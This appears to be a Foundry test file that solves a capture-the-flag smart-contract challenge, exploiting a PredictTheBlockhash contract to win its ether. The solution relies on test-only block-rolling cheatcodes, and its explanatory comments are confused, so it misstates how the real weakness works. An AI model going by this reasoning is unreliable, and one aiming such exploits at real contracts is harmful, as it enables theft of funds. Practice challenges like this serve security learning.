// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    /**
    1. Calculated the blockhash based on the block.number passed two, It's ok just as the passed block.number greater than 2. For simplicity there just add 2.
    2. Set the guess as this blockhash   when call the  PredictTheBlockhash.   lockInGuess(bytes32 hash)
    3. Call settle() while block.number increase two.

    tips:  hash of the given block - only works for 256 most recent, excluding current, blocks. so to calculate the block hash. just use  vm.roll(block.number+2);/vm.roll(block.number-2);
    to get the next block numer's hash value.
    
     */
    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number+10000;
        // To roll forward, add the number of blocks to -256,
        // Eg. roll forward 10 blocks: -256 + 10 = -246
        vm.roll(blockNumber - 256);

        // Put your solution here
        vm.deal(address(this), 1 ether); 

        // current block number 

        vm.roll(block.number+2);
        bytes32 answer = blockhash(block.number - 1);
        vm.roll(block.number-2);
       
        predictTheBlockhash.lockInGuess{value: 1 ether}(answer);

        vm.roll(block.number+2);
        predictTheBlockhash.settle();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
